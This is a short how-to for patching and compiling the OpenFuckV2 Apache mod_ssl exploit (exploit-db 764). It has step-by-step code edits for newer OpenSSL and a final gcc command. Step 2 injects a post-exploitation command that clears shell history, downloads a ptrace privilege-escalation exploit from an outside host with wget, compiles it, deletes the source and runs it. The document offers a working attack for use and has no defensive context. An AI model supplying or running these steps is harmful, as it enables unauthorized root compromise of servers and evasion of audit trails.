# Credits
https://www.hypn.za.net/blog/2017/08/27/compiling-exploit-764-c-in-2017/
https://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/

# Exploit OpenFuckV2
https://www.exploit-db.com/exploits/764/

# Instructions
1. Add this below line 24 (the last #include):

#include <openssl/rc4.h>
#include <openssl/md5.h>

#define SSL2_MT_ERROR 0
#define SSL2_MT_CLIENT_FINISHED 3
#define SSL2_MT_SERVER_HELLO 4
#define SSL2_MT_SERVER_VERIFY 5
#define SSL2_MT_SERVER_FINISHED 6
#define SSL2_MAX_CONNECTION_ID_LENGTH 16

2. Replace “COMMAND2” on (now) line 672:

#define COMMAND2 “unset HISTFILE; cd /tmp; wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n”
*The box must have Internet connection

3. Add “const” to the beginning of (now) line 970:

const unsigned char *p, *end;

4. Replace the “if” on (now) line 1078 with:

if (EVP_PKEY_get1_RSA(pkey) == NULL) {

5. Replace the “encrypted_key_length” code on (now) line 1084 with:

encrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl->master_key, &buf[10], EVP_PKEY_get1_RSA(pkey), RSA_PKCS1_PADDING);

6. Install “libssl-dev” (if not already installed):

apt–get install libssl–dev
*Install libssl1.0-dev instead of libssl–dev if it's not working.


7. Compile!

# gcc -o 764 764.c -lcrypto
